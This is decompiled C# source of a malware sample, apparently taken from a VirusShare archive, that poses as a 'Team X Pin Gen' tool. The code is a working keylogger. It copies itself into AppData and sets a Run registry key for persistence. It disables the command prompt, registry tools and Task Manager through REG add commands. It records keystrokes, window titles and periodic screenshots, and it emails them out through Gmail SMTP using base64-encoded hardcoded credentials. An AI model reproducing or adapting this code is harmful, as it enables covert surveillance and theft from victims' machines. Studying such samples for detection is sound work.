// Decompiled with JetBrains decompiler
// Type: CJnzzPTWOmCueMP
// Assembly: Team X Pin Gen, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CD443994-BB85-4AA0-A8E7-53E1225844E8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00022-msil\Trojan-Ransom.Win32.Blocker.jfpk-94de20b0dd8db6df9f193cbc5eec77f677bb6921aac250c212ade74d64b1a479.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class CJnzzPTWOmCueMP
{
  private static string jMQeaKXwwYgsVoU = "Y29uYUBhdmFsYW5lLm9yZw==";
  private static string rKjKVPhRnXinkvN = "azMxcHFtbngxMjM=";
  private static string bjktSMprYexGvbW = "smtp.gmail.com";
  private static int XVaLSZpQQgWYQpS = 587;
  private static string JnzzPTWOmCueMPj;
  private static string MQeaKXwwYgsVoUr;
  private static string KjKVPhRnXinkvNb;
  private static string jktSMprYexGvbWX;
  private static string VaLSZpQQgWYQpSw;
  private static string BvZbIchpfLUUSXu;
  private static int JlFkJamaYSkhEny = 900000;
  private static string OblHUItVrqSzRDH = (string) null;
  private static object wucRlcTgraZNNow = (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static string EBMdezBKiPsIouO = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static MailMessage WMrmnlqbUcGhSim = new MailMessage();
  private static SmtpClient jiyDGwWleOvxTvz = new SmtpClient();
  [AccessedThroughProperty("iyDGwWleOvxTvzO")]
  private static OYsHtgHdcFmEptT _iyDGwWleOvxTvzO;
  private static object yROkHfXTfwLgUdB;
  private static RichTextBox kxwNQTLjyrbKMgJ;

  static CJnzzPTWOmCueMP()
  {
    CJnzzPTWOmCueMP.iyDGwWleOvxTvzO = new OYsHtgHdcFmEptT();
    CJnzzPTWOmCueMP.yROkHfXTfwLgUdB = (object) Path.GetFileName(Application.ExecutablePath);
    CJnzzPTWOmCueMP.kxwNQTLjyrbKMgJ = new RichTextBox();
  }

  private static OYsHtgHdcFmEptT iyDGwWleOvxTvzO
  {
    get => CJnzzPTWOmCueMP._iyDGwWleOvxTvzO;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (CJnzzPTWOmCueMP._iyDGwWleOvxTvzO != null)
        OYsHtgHdcFmEptT.KeyDown -= new OYsHtgHdcFmEptT.KeyDownEventHandler(CJnzzPTWOmCueMP.uCJnzzPTWOmCueM);
      CJnzzPTWOmCueMP._iyDGwWleOvxTvzO = value;
      if (CJnzzPTWOmCueMP._iyDGwWleOvxTvzO == null)
        return;
      OYsHtgHdcFmEptT.KeyDown += new OYsHtgHdcFmEptT.KeyDownEventHandler(CJnzzPTWOmCueMP.uCJnzzPTWOmCueM);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int QqNaoVmZdDqoiBx(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  public static void main()
  {
    CJnzzPTWOmCueMP.BvZbIchpfLUUSXu = Conversions.ToString(true);
    CJnzzPTWOmCueMP.KjKVPhRnXinkvNb = Conversions.ToString(true);
    CJnzzPTWOmCueMP.jktSMprYexGvbWX = Conversions.ToString(true);
    CJnzzPTWOmCueMP.VaLSZpQQgWYQpSw = Conversions.ToString(true);
    CJnzzPTWOmCueMP.MQeaKXwwYgsVoUr = Conversions.ToString(true);
    CJnzzPTWOmCueMP.JnzzPTWOmCueMPj = Conversions.ToString(true);
    if (!Operators.ConditionalCompareObjectEqual((object) Application.StartupPath, CJnzzPTWOmCueMP.wucRlcTgraZNNow, false))
    {
      using (System.IO.File.Create(Conversions.ToString(Operators.ConcatenateObject(CJnzzPTWOmCueMP.wucRlcTgraZNNow, (object) "\\MrmnlqbUcGhSimo.txt"))))
        ;
      StreamWriter streamWriter = new StreamWriter(CJnzzPTWOmCueMP.EBMdezBKiPsIouO + "\\MrmnlqbUcGhSimo.txt");
      streamWriter.Write(Application.ExecutablePath);
      streamWriter.Flush();
      streamWriter.Close();
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(CJnzzPTWOmCueMP.wucRlcTgraZNNow, (object) "\\"), CJnzzPTWOmCueMP.yROkHfXTfwLgUdB))))
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(CJnzzPTWOmCueMP.wucRlcTgraZNNow, (object) "\\"), CJnzzPTWOmCueMP.yROkHfXTfwLgUdB)));
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(CJnzzPTWOmCueMP.wucRlcTgraZNNow, (object) "\\"), CJnzzPTWOmCueMP.yROkHfXTfwLgUdB)));
      }
      else
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(CJnzzPTWOmCueMP.wucRlcTgraZNNow, (object) "\\"), CJnzzPTWOmCueMP.yROkHfXTfwLgUdB)));
      NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
      {
        Operators.AddObject(Operators.AddObject(CJnzzPTWOmCueMP.wucRlcTgraZNNow, (object) "\\"), CJnzzPTWOmCueMP.yROkHfXTfwLgUdB)
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
    if (Conversions.ToBoolean(CJnzzPTWOmCueMP.JnzzPTWOmCueMPj) && RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Conversions.ToString(CJnzzPTWOmCueMP.yROkHfXTfwLgUdB))) == null)
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(CJnzzPTWOmCueMP.yROkHfXTfwLgUdB), Operators.ConcatenateObject(Operators.ConcatenateObject(CJnzzPTWOmCueMP.wucRlcTgraZNNow, (object) "\\"), CJnzzPTWOmCueMP.yROkHfXTfwLgUdB));
    if (Conversions.ToBoolean(CJnzzPTWOmCueMP.MQeaKXwwYgsVoUr))
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(CJnzzPTWOmCueMP.wucRlcTgraZNNow, (object) "\\MrmnlqbUcGhSimo.txt")))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (Conversions.ToBoolean(CJnzzPTWOmCueMP.KjKVPhRnXinkvNb))
      Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(CJnzzPTWOmCueMP.jktSMprYexGvbWX))
      Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(CJnzzPTWOmCueMP.VaLSZpQQgWYQpSw))
      Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
    timer1.Interval = 900000;
    timer1.Tick += new EventHandler(CJnzzPTWOmCueMP.YsHtgHdcFmEptTt_Ticked);
    timer1.Start();
    System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
    timer2.Interval = 300;
    timer2.Tick += new EventHandler(CJnzzPTWOmCueMP.FyROkHfXTfwLgUd_Ticked);
    timer2.Start();
    CJnzzPTWOmCueMP.iyDGwWleOvxTvzO.tFyROkHfXTfwLgU();
    Application.Run();
  }

  private static string UqPVRcfuQRbkfJY()
  {
    string lpString = new string(char.MinValue, 100);
    CJnzzPTWOmCueMP.QqNaoVmZdDqoiBx(CJnzzPTWOmCueMP.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  public static string PjMQeaKXwwYgsVo(string kkjnZfnEedtjmeD) => Encoding.ASCII.GetString(Convert.FromBase64String(kkjnZfnEedtjmeD));

  public static void YsHtgHdcFmEptTt_Ticked(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(CJnzzPTWOmCueMP.BvZbIchpfLUUSXu))
    {
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      string Right = CJnzzPTWOmCueMP.hrPKnpWpvEsYhig(6);
      bitmap.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(CJnzzPTWOmCueMP.wucRlcTgraZNNow, (object) "\\"), (object) Right), (object) ".jpeg")));
      try
      {
        MailMessage message = new MailMessage();
        Attachment attachment = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(CJnzzPTWOmCueMP.wucRlcTgraZNNow, (object) "\\"), (object) Right), (object) ".jpeg")));
        message.From = new MailAddress(CJnzzPTWOmCueMP.PjMQeaKXwwYgsVo(CJnzzPTWOmCueMP.jMQeaKXwwYgsVoU));
        message.To.Add(CJnzzPTWOmCueMP.PjMQeaKXwwYgsVo(CJnzzPTWOmCueMP.jMQeaKXwwYgsVoU));
        message.Subject = "COOLogger Logs From - " + Environment.UserName;
        message.Body = CJnzzPTWOmCueMP.kxwNQTLjyrbKMgJ.Text;
        message.Attachments.Add(attachment);
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = (ICredentialsByHost) new NetworkCredential(CJnzzPTWOmCueMP.PjMQeaKXwwYgsVo(CJnzzPTWOmCueMP.jMQeaKXwwYgsVoU), CJnzzPTWOmCueMP.PjMQeaKXwwYgsVo(CJnzzPTWOmCueMP.rKjKVPhRnXinkvN))
        };
        smtpClient.EnableSsl = true;
        smtpClient.Send(message);
        CJnzzPTWOmCueMP.kxwNQTLjyrbKMgJ.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      MailMessage wmrmnlqbUcGhSim = CJnzzPTWOmCueMP.WMrmnlqbUcGhSim;
      wmrmnlqbUcGhSim.From = new MailAddress(CJnzzPTWOmCueMP.PjMQeaKXwwYgsVo(CJnzzPTWOmCueMP.jMQeaKXwwYgsVoU));
      wmrmnlqbUcGhSim.To.Add(CJnzzPTWOmCueMP.PjMQeaKXwwYgsVo(CJnzzPTWOmCueMP.jMQeaKXwwYgsVoU));
      wmrmnlqbUcGhSim.Subject = "COOLogger Logs from - " + Environment.UserName;
      wmrmnlqbUcGhSim.Body = CJnzzPTWOmCueMP.kxwNQTLjyrbKMgJ.Text;
      SmtpClient jiyDgwWleOvxTvz = CJnzzPTWOmCueMP.jiyDGwWleOvxTvz;
      jiyDgwWleOvxTvz.Host = "smtp.gmail.com";
      jiyDgwWleOvxTvz.Port = 587;
      jiyDgwWleOvxTvz.EnableSsl = true;
      jiyDgwWleOvxTvz.Credentials = (ICredentialsByHost) new NetworkCredential(CJnzzPTWOmCueMP.PjMQeaKXwwYgsVo(CJnzzPTWOmCueMP.jMQeaKXwwYgsVoU), CJnzzPTWOmCueMP.PjMQeaKXwwYgsVo(CJnzzPTWOmCueMP.rKjKVPhRnXinkvN));
      jiyDgwWleOvxTvz.Send(CJnzzPTWOmCueMP.WMrmnlqbUcGhSim);
      CJnzzPTWOmCueMP.kxwNQTLjyrbKMgJ.Text = "";
    }
  }

  public static void uCJnzzPTWOmCueM(Keys e) => CJnzzPTWOmCueMP.kxwNQTLjyrbKMgJ.Text += CJnzzPTWOmCueMP.iyDGwWleOvxTvzO.dBvZbIchpfLUUSX(e);

  public static void FyROkHfXTfwLgUd_Ticked(object sender, EventArgs e)
  {
    if (Operators.CompareString(CJnzzPTWOmCueMP.OblHUItVrqSzRDH, CJnzzPTWOmCueMP.UqPVRcfuQRbkfJY(), false) == 0)
      return;
    CJnzzPTWOmCueMP.OblHUItVrqSzRDH = CJnzzPTWOmCueMP.UqPVRcfuQRbkfJY();
    if (Operators.CompareString(CJnzzPTWOmCueMP.OblHUItVrqSzRDH, "", false) == 0)
      return;
    RichTextBox kxwNqtLjyrbKmgJ = CJnzzPTWOmCueMP.kxwNQTLjyrbKMgJ;
    kxwNqtLjyrbKmgJ.Text = kxwNqtLjyrbKmgJ.Text + "\r\n\r\n~~~~~" + CJnzzPTWOmCueMP.OblHUItVrqSzRDH + " (" + DateAndTime.Now.ToLongTimeString() + ")~~~~~\r\n";
  }

  public static string hrPKnpWpvEsYhig(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
